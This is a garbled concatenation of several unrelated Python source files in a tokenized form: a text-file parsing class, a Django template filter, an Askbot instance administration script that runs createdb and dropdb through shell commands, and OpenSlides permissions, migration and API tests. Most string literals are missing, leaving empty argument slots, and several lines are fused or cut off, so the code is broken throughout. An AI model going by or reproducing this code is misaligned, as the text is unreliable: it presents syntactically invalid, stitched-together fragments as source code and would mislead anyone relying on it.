# If we are marking a new anchor from an existing anchor, and \n 
# the anchor is mid-line, then we still search the line, but \n 
# only after the anchor. \n 
if count == 0 and self . anchored : \n 
~~~ line = line . split ( anchor ) [ - 1 ] \n 
\n 
~~ if anchor in line : \n 
\n 
~~~ instance += 1 \n 
if instance == occurrence : \n 
~~~ self . current_row += count \n 
self . anchored = True \n 
return \n 
\n 
~~ ~~ count += 1 \n 
\n 
~~ ~~ elif occurrence < 0 : \n 
~~~ max_lines = len ( self . data ) - 1 \n 
count = max_lines \n 
for index in range ( max_lines , - 1 , - 1 ) : \n 
~~~ line = self . data [ index ] \n 
\n 
# If we are marking a new anchor from an existing anchor, and \n 
# the anchor is mid-line, then we still search the line, but \n 
# only before the anchor. \n 
if count == max_lines and self . anchored : \n 
~~~ line = line . split ( anchor ) [ 0 ] \n 
\n 
~~ if anchor in line : \n 
~~~ instance += - 1 \n 
if instance == occurrence : \n 
~~~ self . current_row = count \n 
self . anchored = True \n 
return \n 
\n 
~~ ~~ count -= 1 \n 
~~ ~~ else : \n 
~~~ raise ValueError ( "0 is not valid for an anchor occurrence." ) \n 
\n 
~~ raise RuntimeError ( "Could not find pattern %s in output file %s" % ( anchor , self . filename ) ) \n 
\n 
~~ def reset_anchor ( self ) : \n 
~~~ """Resets anchor to the beginning of the file.""" \n 
\n 
self . current_row = 0 \n 
self . anchored = False \n 
\n 
~~ def transfer_line ( self , row ) : \n 
~~~ """Returns a whole line, relative to current anchor.\n\n        Args\n        ----\n        row : integer\n            Number of lines offset from anchor line (0 is anchor line).\n            This can be negative.\n\n        Returns\n        -------\n            string : line at the location requested""" \n 
\n 
return self . data [ self . current_row + row ] . rstrip ( ) \n 
\n 
~~ def transfer_var ( self , row , field , fieldend = None ) : \n 
~~~ """Grabs a single variable relative to the current anchor.\n\n        Args\n        ----\n        row : integer\n            Number of lines offset from anchor line (0 is anchor line).\n            This can be negative.\n\n        field : integer\n            If the delimiter is a set of chars: which word in line to retrieve.\n            If the delimiter is \'columns\': character position to start.\n\n        fieldend : integer (optional)\n            If the delimiter is a set of chars: IGNORED.\n            If the delimiter is \'columns\': position of last character to return, or if\n            omitted, the end of the line is used.\n\n        Returns\n        -------\n            string : data from the requested location in the file\n        """ \n 
\n 
j = self . current_row + row \n 
line = self . data [ j ] \n 
\n 
if self . delimiter == "columns" : \n 
\n 
~~~ if not fieldend : \n 
~~~ line = line [ ( field - 1 ) : ] \n 
~~ else : \n 
~~~ line = line [ ( field - 1 ) : ( fieldend ) ] \n 
\n 
# Let pyparsing figure out if this is a number, and return it \n 
# as a float or int as appropriate \n 
~~ data = self . _parse_line ( ) . parseString ( line ) \n 
\n 
# data might have been split if it contains whitespace. If so, \n 
# just return the whole string \n 
if len ( data ) > 1 : \n 
~~~ return line \n 
~~ else : \n 
~~~ return data [ 0 ] \n 
~~ ~~ else : \n 
~~~ data = self . _parse_line ( ) . parseString ( line ) \n 
return data [ field - 1 ] \n 
\n 
~~ ~~ def transfer_keyvar ( self , key , field , occurrence = 1 , rowoffset = 0 ) : \n 
~~~ """Searches for a key relative to the current anchor and then grabs\n        a field from that line.\n\n        You can do the same thing with a call to ``mark_anchor`` and ``transfer_var``.\n        This function just combines them for convenience.\n\n        Args\n        ----\n        field : integer\n            Which field to transfer. Field 0 is the key.\n\n        occurrence : integer\n            Find nth instance of text; default is 1 (first value\n            field). Use -1 to find last occurance. Position 0 is the key\n            field, so it should not be used as a value for occurrence.\n\n        rowoffset : integer (optional)\n            Optional row offset from the occurrence of key. This can\n            also be negative.\n\n        Returns\n        -------\n            string : data from the requested location in the file\n        """ \n 
\n 
if not isinstance ( occurrence , int ) or occurrence == 0 : \n 
~~~ msg = "The value for occurrence must be a nonzero integer" \n 
raise ValueError ( msg ) \n 
\n 
~~ instance = 0 \n 
if occurrence > 0 : \n 
~~~ row = 0 \n 
for line in self . data [ self . current_row : ] : \n 
~~~ if line . find ( key ) > - 1 : \n 
~~~ instance += 1 \n 
if instance == occurrence : \n 
~~~ break \n 
\n 
~~ ~~ row += 1 \n 
\n 
~~ ~~ elif occurrence < 0 : \n 
~~~ row = - 1 \n 
for line in reversed ( self . data [ self . current_row : ] ) : \n 
~~~ if line . find ( key ) > - 1 : \n 
~~~ instance += - 1 \n 
if instance == occurrence : \n 
~~~ break \n 
\n 
~~ ~~ row -= 1 \n 
\n 
~~ ~~ j = self . current_row + row + rowoffset \n 
line = self . data [ j ] \n 
\n 
fields = self . _parse_line ( ) . parseString ( line . replace ( key , "KeyField" ) ) \n 
\n 
return fields [ field ] \n 
\n 
~~ def transfer_array ( self , rowstart , fieldstart , rowend = None , fieldend = None ) : \n 
~~~ """Grabs an array of variables relative to the current anchor.\n\n        Setting the delimiter to \'columns\' elicits some special behavior\n        from this method. Normally, the extraction process wraps around\n        at the end of a line and continues grabbing each field at the start of\n        a newline. When the delimiter is set to columns, the parameters\n        (rowstart, fieldstart, rowend, fieldend) demark a box, and all\n        values in that box are retrieved. Note that standard whitespace\n        is the secondary delimiter in this case.\n\n        Args\n        ----\n        rowstart : integer\n            Row number to start, relative to the current anchor.\n\n        fieldstart : integer\n            Field number to start.\n\n        rowend : integer, optional\n            Row number to end. If not set, then only one row is grabbed.\n\n        fieldend : integer\n            Field number to end.\n\n        Returns\n        -------\n            string : data from the requested location in the file\n        """ \n 
\n 
j1 = self . current_row + rowstart \n 
\n 
if rowend is None : \n 
~~~ j2 = j1 + 1 \n 
~~ else : \n 
~~~ j2 = self . current_row + rowend + 1 \n 
\n 
~~ if not fieldend : \n 
~~~ raise ValueError ( "fieldend is missing, currently required" ) \n 
\n 
~~ lines = self . data [ j1 : j2 ] \n 
\n 
data = np . zeros ( shape = ( 0 , 0 ) ) \n 
\n 
for i , line in enumerate ( lines ) : \n 
~~~ if self . delimiter == "columns" : \n 
~~~ line = line [ ( fieldstart - 1 ) : fieldend ] \n 
\n 
# Stripping whitespace may be controversial. \n 
line = line . strip ( ) \n 
\n 
# Let pyparsing figure out if this is a number, and return it \n 
# as a float or int as appropriate \n 
parsed = self . _parse_line ( ) . parseString ( line ) \n 
\n 
newdata = np . array ( parsed [ : ] ) \n 
# data might have been split if it contains whitespace. If the \n 
\n 
if newdata . dtype . type is np . str_ : \n 
~~~ newdata = np . array ( line ) \n 
\n 
~~ data = np . append ( data , newdata ) \n 
\n 
~~ else : \n 
~~~ parsed = self . _parse_line ( ) . parseString ( line ) \n 
if i == j2 - j1 - 1 : \n 
~~~ data = np . append ( data , np . array ( parsed [ ( fieldstart - 1 ) : fieldend ] ) ) \n 
~~ else : \n 
~~~ data = np . append ( data , np . array ( parsed [ ( fieldstart - 1 ) : ] ) ) \n 
~~ fieldstart = 1 \n 
\n 
~~ ~~ return data \n 
\n 
~~ def transfer_2Darray ( self , rowstart , fieldstart , rowend , fieldend = None ) : \n 
~~~ """Grabs a 2D array of variables relative to the current anchor. Each\n        line of data is placed in a separate row.\n\n        If the delimiter is set to \'columns\', then the values contained in\n        fieldstart and fieldend should be the column number instead of the\n        field number.\n\n        Args\n        ----\n        rowstart : integer\n            Row number to start, relative to the current anchor.\n\n        fieldstart : integer\n            Field number to start.\n\n        rowend : integer\n            Row number to end relative to current anchor.\n\n        fieldend : integer (optional)\n            Field number to end. If not specified, grabs all fields up to the\n            end of the line.\n\n        Returns\n        -------\n            string : data from the requested location in the file\n        """ \n 
\n 
if fieldend and ( fieldstart > fieldend ) : \n 
~~~ msg = "fieldend must be greater than fieldstart" \n 
raise ValueError ( msg ) \n 
\n 
~~ if rowstart > rowend : \n 
~~~ msg = "rowend must be greater than rowstart" \n 
raise ValueError ( msg ) \n 
\n 
~~ j1 = self . current_row + rowstart \n 
j2 = self . current_row + rowend + 1 \n 
lines = list ( self . data [ j1 : j2 ] ) \n 
\n 
if self . delimiter == "columns" : \n 
\n 
~~~ if fieldend : \n 
~~~ line = lines [ 0 ] [ ( fieldstart - 1 ) : fieldend ] \n 
~~ else : \n 
~~~ line = lines [ 0 ] [ ( fieldstart - 1 ) : ] \n 
\n 
~~ parsed = self . _parse_line ( ) . parseString ( line ) \n 
row = np . array ( parsed [ : ] ) \n 
data = np . zeros ( shape = ( abs ( j2 - j1 ) , len ( row ) ) ) \n 
data [ 0 , : ] = row \n 
\n 
for i , line in enumerate ( list ( lines [ 1 : ] ) ) : \n 
~~~ if fieldend : \n 
~~~ line = line [ ( fieldstart - 1 ) : fieldend ] \n 
~~ else : \n 
~~~ line = line [ ( fieldstart - 1 ) : ] \n 
\n 
~~ parsed = self . _parse_line ( ) . parseString ( line ) \n 
data [ i + 1 , : ] = np . array ( parsed [ : ] ) \n 
\n 
~~ ~~ else : \n 
~~~ parsed = self . _parse_line ( ) . parseString ( lines [ 0 ] ) \n 
if fieldend : \n 
~~~ row = np . array ( parsed [ ( fieldstart - 1 ) : fieldend ] ) \n 
~~ else : \n 
~~~ row = np . array ( parsed [ ( fieldstart - 1 ) : ] ) \n 
\n 
~~ data = np . zeros ( shape = ( abs ( j2 - j1 ) , len ( row ) ) ) \n 
data [ 0 , : ] = row \n 
\n 
for i , line in enumerate ( list ( lines [ 1 : ] ) ) : \n 
~~~ parsed = self . _parse_line ( ) . parseString ( line ) \n 
\n 
if fieldend : \n 
~~~ try : \n 
~~~ data [ i + 1 , : ] = np . array ( parsed [ ( fieldstart - 1 ) : fieldend ] ) \n 
~~ except : \n 
~~~ print ( data ) \n 
~~ ~~ else : \n 
~~~ data [ i + 1 , : ] = np . array ( parsed [ ( fieldstart - 1 ) : ] ) \n 
\n 
~~ ~~ ~~ return data \n 
\n 
~~ def _parse_line ( self ) : \n 
~~~ """Parse a single data line that may contain string or numerical data.\n        Float and Int \'words\' are converted to their appropriate type.\n        Exponentiation is supported, as are NaN and Inf.""" \n 
\n 
return self . line_parse_token \n 
\n 
~~ def _reset_tokens ( self ) : \n 
~~~ """Sets up the tokens for pyparsing.""" \n 
\n 
# Somewhat of a hack, but we can only use printables if the delimiter is \n 
\n 
# get parsed into the general string text. So, if we have non whitespace \n 
# delimiters, we need to fall back to just alphanums, and then add in any \n 
# missing but important symbols to parse. \n 
if self . delimiter . isspace ( ) : \n 
~~~ textchars = printables \n 
~~ else : \n 
~~~ textchars = alphanums \n 
\n 
symbols = [ , , , , , , , , , , \n 
, , , , , , , , , , \n 
, , , , , , ] \n 
\n 
for symbol in symbols : \n 
~~~ if symbol not in self . delimiter : \n 
~~~ textchars = textchars + symbol \n 
\n 
~~ ~~ ~~ digits = Word ( nums ) \n 
dot = "." \n 
sign = oneOf ( "+ -" ) \n 
ee = CaselessLiteral ( ) | CaselessLiteral ( ) \n 
\n 
num_int = ToInteger ( Combine ( Optional ( sign ) + digits ) ) \n 
\n 
num_float = ToFloat ( Combine ( Optional ( sign ) + \n 
( ( digits + dot + Optional ( digits ) ) | \n 
( dot + digits ) ) + \n 
Optional ( ee + Optional ( sign ) + digits ) \n 
) ) \n 
\n 
# special case for a float written like "3e5" \n 
mixed_exp = ToFloat ( Combine ( digits + ee + Optional ( sign ) + digits ) ) \n 
\n 
nan = ToInf ( oneOf ( "Inf -Inf" ) ) | ToNan ( oneOf ( "NaN nan NaN%  NaNQ NaNS qNaN sNaN " + "1.#SNAN 1.#QNAN -1.#IND" ) ) \n 
\n 
string_text = Word ( textchars ) \n 
\n 
self . line_parse_token = ( OneOrMore ( ( nan | num_float | mixed_exp | num_int | \n 
string_text ) ) ) \n 
~~ ~~ from django import template \n 
\n 
register = template . Library ( ) \n 
\n 
@ register . filter ( name = ) \n 
def get_item ( dictionary , key ) : \n 
~~~ return getattr ( dictionary , key ) \n 
#!/usr/bin/env python \n 
# -*- coding: utf8 -*- \n 
# Copyright 2013 Yaco Sistemas S.L. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ """\nAskbot instance administration tool for creating, disabling or destroying\naskbot instances\n""" \n 
\n 
# - Create methods that invoke fabric to copy the nginx.forward.conf if \n 
#    necessary to the proxy nginx (_copy_to_remote). TODO \n 
# - Create method that launches the supervisor and gunicorn of the instance \n 
\n 
import sys \n 
import os \n 
import time \n 
\n 
\n 
# Check Python version \n 
if sys . version_info < ( 2 , 6 , 0 ) : \n 
~~~ print ( \n 
) \n 
~~ elif sys . version_info >= ( 3 , 0 , 0 ) : \n 
~~~ sys . stderr . write ( \n 
) \n 
sys . exit ( 2 ) \n 
\n 
# Add directories to path \n 
~~ sys . path . insert ( 0 , ) \n 
sys . path . insert ( 0 , os . getcwd ( ) ) \n 
\n 
import shutil \n 
import optparse \n 
import requests \n 
import subprocess \n 
\n 
try : \n 
~~~ import instances_creator_conf as icc \n 
#from fabric.api import run, env, hosts  # TODO \n 
import psycopg2 \n 
~~ except ImportError : \n 
~~~ sys . stderr . write ( \n 
\n 
) \n 
sys . exit ( 3 ) \n 
\n 
~~ os . environ [ ] = icc . DB_PASSWORD \n 
\n 
\n 
class AskbotInstance ( ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ """\n        Shared stuff between all the methods.\n        """ \n 
# Detect if $USER=root \n 
if not os . environ [ ] == : \n 
~~~ self . abort ( ) \n 
\n 
# Include the default instances dir in the PATH \n 
~~ sys . path . insert ( 0 , icc . DEFAULT_INSTANCE_DIR ) \n 
\n 
#def _copy_to_remote(self, nginx_forward_file): # TODO \n 
#""" \n 
#Copies to the remote host specified in REMOTE_HOST the nginx forward \n 
#file. \n 
#""" \n 
#env.hosts = [icc.REMOTE_HOST] \n 
\n 
\n 
~~ def _populate_file ( self , original_file , values ) : \n 
~~~ """\n        Basic abstraction layer for populating files on demand\n\n        original_file has to be a path to the file in string format\n        values is a dictionary containing the necessary key:value pairs.\n        """ \n 
f = open ( original_file , ) \n 
file_content = f . read ( ) \n 
f . close ( ) \n 
# Create a new populated file. We use ** so we can use keyword \n 
# replacement \n 
populated_settings = file_content . format ( ** values ) \n 
# Open the file in write mode so we can rewrite it \n 
f = open ( original_file , ) \n 
f . write ( populated_settings ) \n 
f . close ( ) \n 
\n 
~~ def create_instance ( self , instance_name , instance_db_name ) : \n 
~~~ """\n        Create the main instance in the instances directory.\n        """ \n 
INSTANCE_DIR = os . path . join ( icc . DEFAULT_INSTANCE_DIR , instance_name ) \n 
# First, copy the skel template in the destination directory \n 
try : \n 
~~~ shutil . copytree ( icc . SKEL_DIR , INSTANCE_DIR ) \n 
os . chdir ( INSTANCE_DIR ) \n 
# Second, call populate_file \n 
template = os . path . join ( INSTANCE_DIR , ) \n 
\n 
os . symlink ( \n 
os . path . join ( , , ) , \n 
os . path . join ( INSTANCE_DIR , ) ) \n 
\n 
values = { \n 
: instance_name , \n 
: instance_db_name , \n 
: icc . DB_HOST , \n 
: icc . BASE_URL \n 
} \n 
self . _populate_file ( template , values ) \n 
print ( . format ( instance_name ) ) \n 
~~ except : \n 
~~~ self . abort ( \n 
\n 
\n 
) \n 
\n 
~~ ~~ def create_db ( self , instance_db_name ) : \n 
~~~ """\n        Create the database for the designated instance.\n        """ \n 
createdb = subprocess . Popen ( ( \'su - postgres -c "createdb %s -w -O %s \' \n 
\'-E UTF8"\' ) % ( instance_db_name , \n 
icc . DB_USER ) , shell = True ) \n 
createdb . wait ( ) # Wait until it finishes \n 
try : \n 
~~~ psycopg2 . connect ( \n 
database = instance_db_name , \n 
user = icc . DB_USER , \n 
password = icc . DB_PASSWORD , \n 
host = icc . DB_HOST \n 
) \n 
print ( \n 
. format ( instance_db_name ) ) \n 
~~ except : \n 
~~~ self . abort ( \n 
) \n 
\n 
~~ ~~ def syncdb_and_migrate ( self , instance_name ) : \n 
~~~ """\n        Do the syncdb and migrate actions for the selected intance. Please note\n        that this action does not create the superuser, it just synchronizes\n        and migrates the database.\n        """ \n 
working_dir = os . path . join ( icc . DEFAULT_INSTANCE_DIR , instance_name ) \n 
os . chdir ( working_dir ) \n 
syncdb = subprocess . Popen ( ( \n 
) , shell = True ) \n 
syncdb . wait ( ) \n 
\n 
~~ def collect_static ( seld , instance_name ) : \n 
~~~ """\n        Collect all the static files and prepare them to be used\n        """ \n 
working_dir = os . path . join ( icc . DEFAULT_INSTANCE_DIR , instance_name ) \n 
os . chdir ( working_dir ) \n 
collectstatic = subprocess . Popen ( ( \n 
) , \n 
shell = True ) \n 
collectstatic . wait ( ) \n 
\n 
~~ def add_instance_to_supervisor ( self , instance_name ) : \n 
~~~ """\n        Creates the supervisor file into the directory\n        """ \n 
INSTANCE_DIR = os . path . join ( icc . DEFAULT_INSTANCE_DIR , instance_name ) \n 
try : \n 
~~~ template = os . path . join ( INSTANCE_DIR , ) \n 
values = { \n 
: instance_name , \n 
: INSTANCE_DIR \n 
} \n 
self . _populate_file ( template , values ) \n 
os . symlink ( template , os . path . join ( \n 
, , \n 
% instance_name ) ) \n 
print ( ) \n 
~~ except : \n 
~~~ self . abort ( \n 
) \n 
\n 
~~ ~~ def add_instance_to_nginx ( self , instance_name ) : \n 
~~~ """\n        Creates the nginx file for the local askbot and also the nginx forward\n        configuration for the proxy machine. Remember that some values of the\n        forward file need to be changed manually!\n        """ \n 
INSTANCE_DIR = os . path . join ( icc . DEFAULT_INSTANCE_DIR , instance_name ) \n 
try : \n 
# Populate the nginx file \n 
~~~ template = os . path . join ( INSTANCE_DIR , ) \n 
values = { : instance_name } \n 
self . _populate_file ( template , values ) \n 
# Populate the nginx.forward file \n 
template = os . path . join ( INSTANCE_DIR , ) \n 
values = { : instance_name } \n 
self . _populate_file ( template , values ) \n 
print ( ) \n 
~~ except : \n 
~~~ self . abort ( \n 
) \n 
\n 
# TODO \n 
\n 
\n 
~~ ~~ def restart_server ( self ) : \n 
~~~ supervisord = subprocess . Popen ( ( \n 
) , shell = True ) \n 
supervisord . wait ( ) \n 
nginx = subprocess . Popen ( ( \n 
) , shell = True ) \n 
nginx . wait ( ) \n 
time . sleep ( 5 ) \n 
\n 
~~ def update_entries_metadata ( self ) : \n 
~~~ """\n        Update all entries\' metadata\n        """ \n 
try : \n 
~~~ update_metadata = subprocess . Popen ( ( \n 
) , \n 
shell = True ) \n 
update_metadata . wait ( ) # Wait until it finishes \n 
\n 
url = ( \n 
) % icc . META_REFRESH_KEY \n 
requests . get ( url ) \n 
~~ except : \n 
~~~ self . abort ( \n 
) \n 
\n 
~~ ~~ def disable_instance ( self , instance_name ) : \n 
~~~ """\n        Disables an instance so it won\'t be available anymore.\n        """ \n 
INSTANCE_DIR = os . path . join ( icc . DEFAULT_INSTANCE_DIR , instance_name ) \n 
try : \n 
\n 
~~~ if not os . path . isdir ( icc . DEFAULT_DISABLED_INSTANCES_DIR ) : \n 
~~~ os . makedirs ( icc . DEFAULT_DISABLED_INSTANCES_DIR ) \n 
# Get the instance dir, copy the data to the disabled folder and \n 
# delete the instance folder. \n 
~~ shutil . copy ( INSTANCE_DIR , icc . DEFAULT_DISABLED_INSTANCES_DIR ) \n 
shutil . rmtree ( INSTANCE_DIR ) \n 
\n 
\n 
# TODO disable the instance at supervisor and nginx levels too \n 
print ( . format ( instance_name ) ) \n 
~~ except : \n 
~~~ self . abort ( \n 
) \n 
\n 
~~ ~~ def destroy_instance ( self , instance_name ) : \n 
~~~ """\n        Destroys the database and contents of the instance completely\n        """ \n 
INSTANCE_DIR = os . path . join ( icc . DEFAULT_INSTANCE_DIR , instance_name ) \n 
# Ensure we can import the instance settings \n 
sys . path . insert ( 0 , INSTANCE_DIR ) \n 
try : \n 
~~~ import instance_settings \n 
~~ except : \n 
~~~ self . abort ( \n 
) \n 
~~ try : \n 
~~~ instance_db_name = instance_settings . DATABASE_NAME \n 
dropdb = subprocess . Popen ( \'su - postgres -c "dropdb %s"\' % \n 
instance_db_name , shell = True ) \n 
dropdb . wait ( ) \n 
shutil . rmtree ( INSTANCE_DIR ) \n 
os . remove ( os . path . join ( , , \n 
% instance_name ) ) \n 
print ( . format ( instance_name ) ) \n 
~~ except : \n 
~~~ self . abort ( \n 
) \n 
\n 
~~ ~~ def abort ( self , msg , status = 1 ) : \n 
~~~ sys . stderr . write ( msg ) \n 
sys . exit ( status ) \n 
\n 
\n 
# Parsing section \n 
~~ ~~ parser = optparse . OptionParser ( \n 
description = ( \n 
\n 
) , \n 
version = \n 
) \n 
parser . add_option ( \n 
, \n 
, \n 
help = , \n 
dest = , \n 
action = , \n 
nargs = 2 \n 
) \n 
parser . add_option ( \n 
, \n 
, \n 
help = , \n 
dest = \n 
) \n 
parser . add_option ( \n 
, \n 
, \n 
help = , \n 
dest = \n 
) \n 
parser . add_option ( \n 
, \n 
help = , \n 
action = , \n 
dest = \n 
) \n 
\n 
( opts , args ) = parser . parse_args ( ) \n 
\n 
inst = AskbotInstance ( ) \n 
\n 
if opts . instance_data : \n 
~~~ INSTANCE_NAME = opts . instance_data [ 0 ] \n 
INSTANCE_DB_NAME = opts . instance_data [ 1 ] \n 
inst . create_instance ( INSTANCE_NAME , INSTANCE_DB_NAME ) \n 
inst . add_instance_to_supervisor ( INSTANCE_NAME ) \n 
inst . add_instance_to_nginx ( INSTANCE_NAME ) \n 
inst . create_db ( INSTANCE_DB_NAME ) \n 
inst . syncdb_and_migrate ( INSTANCE_NAME ) \n 
inst . collect_static ( INSTANCE_NAME ) \n 
inst . restart_server ( ) \n 
if not opts . no_metadata : \n 
~~~ inst . update_entries_metadata ( ) \n 
\n 
~~ ~~ elif opts . disable_instance_name : \n 
~~~ INSTANCE_NAME = opts . disable_instance_name \n 
inst . disable_instance ( INSTANCE_NAME ) \n 
\n 
~~ elif opts . destroy_instance_name : \n 
~~~ INSTANCE_NAME = opts . destroy_instance_name \n 
inst . destroy_instance ( INSTANCE_NAME ) \n 
~~ default_app_config = \n 
from . . utils . access_permissions import BaseAccessPermissions \n 
\n 
\n 
class MediafileAccessPermissions ( BaseAccessPermissions ) : \n 
~~~ """\n    Access permissions container for Mediafile and MediafileViewSet.\n    """ \n 
def can_retrieve ( self , user ) : \n 
~~~ """\n        Returns True if the user has read access model instances.\n        """ \n 
return user . has_perm ( ) \n 
\n 
~~ def get_serializer_class ( self , user = None ) : \n 
~~~ """\n        Returns serializer class.\n        """ \n 
from . serializers import MediafileSerializer \n 
\n 
return MediafileSerializer \n 
# -*- coding: utf-8 -*- \n 
# Generated by Django 1.9.2 on 2016-03-06 14:33 \n 
~~ ~~ from __future__ import unicode_literals \n 
\n 
from django . db import migrations , models \n 
\n 
import openslides . utils . models \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ initial = True \n 
\n 
dependencies = [ \n 
( , ) , \n 
# The next line is not a dependency because we also want to support Django 1.8. \n 
\n 
] \n 
\n 
operations = [ \n 
migrations . CreateModel ( \n 
name = , \n 
fields = [ \n 
( , models . AutoField ( auto_created = True , primary_key = True , serialize = False , verbose_name ( , models . CharField ( max_length = 128 , verbose_name = ) ) , \n 
( , models . DateTimeField ( blank = True , null = True , verbose_name = ( , models . BooleanField ( \n 
default = False , \n 
help_text = verbose_name = ) ) , \n 
( , models . CharField ( blank = True , max_length = 255 , unique = True ) ) , \n 
( , models . CharField ( blank = True , max_length = 255 ) ) , \n 
( , models . CharField ( blank = True , max_length = 255 ) ) , \n 
( , models . CharField ( blank = True , default = , max_length = 255 ) ) , \n 
( , models . CharField ( blank = True , default = , max_length = 50 ) ) , \n 
( , models . TextField ( blank = True , default = ) ) , \n 
( , models . TextField ( blank = True , default = ) ) , \n 
( , models . CharField ( blank = True , default = , max_length = 100 ) ) , \n 
( , models . BooleanField ( default = True ) ) , \n 
( , models . BooleanField ( default = False ) ) , \n 
( , models . ManyToManyField ( \n 
blank = True , \n 
help_text = related_name = , \n 
related_query_name = , \n 
to = , \n 
verbose_name = ) ) , \n 
( , models . ManyToManyField ( \n 
blank = True , \n 
help_text = , \n 
related_name = , \n 
related_query_name = , \n 
to = , \n 
verbose_name = ) ) , \n 
] , \n 
options = { \n 
: ( \n 
( , ) , \n 
( , ) ( , ) ) , \n 
: ( ) , \n 
: ( , , ) , \n 
} , \n 
bases = ( openslides . utils . models . RESTModelMixin , models . Model ) , \n 
) , \n 
] \n 
~~ import json \n 
\n 
from django . core . urlresolvers import reverse \n 
from django . dispatch import receiver \n 
from rest_framework import status \n 
from rest_framework . test import APIClient \n 
\n 
from openslides import __version__ as version \n 
from openslides . core . config import ConfigVariable , config \n 
from openslides . core . models import CustomSlide , Projector \n 
from openslides . core . signals import config_signal \n 
from openslides . utils . rest_api import ValidationError \n 
from openslides . utils . test import TestCase \n 
\n 
\n 
class ProjectorAPI ( TestCase ) : \n 
~~~ """\n    Tests requests from the anonymous user.\n    """ \n 
def test_slide_on_default_projector ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
customslide = CustomSlide . objects . create ( title = , text = default_projector = Projector . objects . get ( pk = 1 ) \n 
default_projector . config = { \n 
: { : , : customslide . id } } \n 
default_projector . save ( ) \n 
\n 
response = self . client . get ( reverse ( , args = [ ] ) ) \n 
\n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( json . loads ( response . content . decode ( ) ) , { \n 
: 1 , \n 
: { \n 
: \n 
{ : customslide . id , \n 
: , \n 
: } } , \n 
: 0 , \n 
: 0 } ) \n 
\n 
~~ def test_invalid_slide_on_default_projector ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
default_projector = Projector . objects . get ( pk = 1 ) \n 
default_projector . config = { \n 
: { : } } \n 
default_projector . save ( ) \n 
\n 
response = self . client . get ( reverse ( , args = [ ] ) ) \n 
\n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( json . loads ( response . content . decode ( ) ) , { \n 
: 1 , \n 
: { \n 
: \n 
{ : , \n 
: , \n 
: } } , \n 
: 0 , \n 
: 0 } ) \n 
\n 
\n 
~~ ~~ class VersionView ( TestCase ) : \n 
~~~ """\n    Tests the version info view.\n    """ \n 
def test_get ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
response = self . client . get ( reverse ( ) ) \n 
self . assertEqual ( json . loads ( response . content . decode ( ) ) , { \n 
: version , \n 
: [ \n 
{ : , \n 
: , \n 
: } ] } ) \n 
\n 
\n 
~~ ~~ class ConfigViewSet ( TestCase ) : \n 
~~~ """\n    Tests requests to deal with config variables.\n    """ \n 
def test_retrieve ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
config [ ] = \n 
response = self . client . get ( reverse ( , args = [ ] ) ) self . assertEqual ( \n 
response . data , \n 
{ : , \n 
: } ) \n 
\n 
~~ def test_update ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( config [ ] , ) \n 
~~ def test_update_wrong_datatype ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_400_BAD_REQUEST ) \n 
self . assertEqual ( response . data , { : "Wrong datatype. Expected <class \'int\'>, got <class \'str\'>." \n 
~~ def test_update_wrong_datatype_that_can_be_converted ( self ) : \n 
~~~ """\n        Try to send a string that can be converted to an integer to an integer\n        field.\n        """ \n 
self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , 200 ) \n 
\n 
~~ def test_update_good_choice ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( config [ ] , ) \n 
\n 
~~ def test_update_bad_choice ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_400_BAD_REQUEST ) \n 
self . assertEqual ( response . data , { : } ) \n 
\n 
~~ def test_update_validator_ok ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( config [ ] , ) \n 
\n 
~~ def test_update_validator_invalid ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_400_BAD_REQUEST ) \n 
self . assertEqual ( response . data , { : } ) \n 
\n 
~~ def test_update_only_with_key ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) ) \n 
self . assertEqual ( response . status_code , status . HTTP_400_BAD_REQUEST ) \n 
self . assertEqual ( response . data , { : } ) \n 
\n 
~~ def test_metadata_with_hidden ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
response = self . client . options ( reverse ( ) ) \n 
filter_obj = filter ( \n 
lambda item : item [ ] == , \n 
response . data [ ] [ 0 ] [ ] [ 0 ] [ ] ) \n 
